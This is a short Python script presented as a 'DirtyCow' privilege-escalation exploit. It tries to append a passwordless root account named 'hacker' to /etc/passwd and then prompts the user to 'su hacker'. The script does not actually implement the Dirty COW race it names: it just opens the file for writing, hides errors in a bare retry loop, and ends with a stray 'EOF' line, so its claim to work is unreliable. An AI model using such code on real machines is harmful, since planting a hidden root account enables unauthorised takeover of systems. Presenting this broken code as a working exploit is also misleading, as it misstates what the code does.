#!/usr/bin/python
import os
import sys
import time

print("[*] DirtyCow exploit")
f = open("/etc/passwd", "r")
content = f.read()
f.close()

if "hacker" not in content:
    print("[*] Adding hacker user with root privileges")
    while True:
        try:
            fd = os.open("/etc/passwd", os.O_RDONLY)
            m = os.fdopen(fd, "r")
            m.seek(0, 2)
            pos = m.tell()
            m.close()
            
            fd2 = os.open("/etc/passwd", os.O_WRONLY)
            os.lseek(fd2, pos, 0)
            os.write(fd2, "hacker::0:0:Hacker:/root:/bin/bash\n")
            os.close(fd2)
            break
        except:
            pass
        time.sleep(0.001)
    print("[+] Done! Try 'su hacker'")
EOF
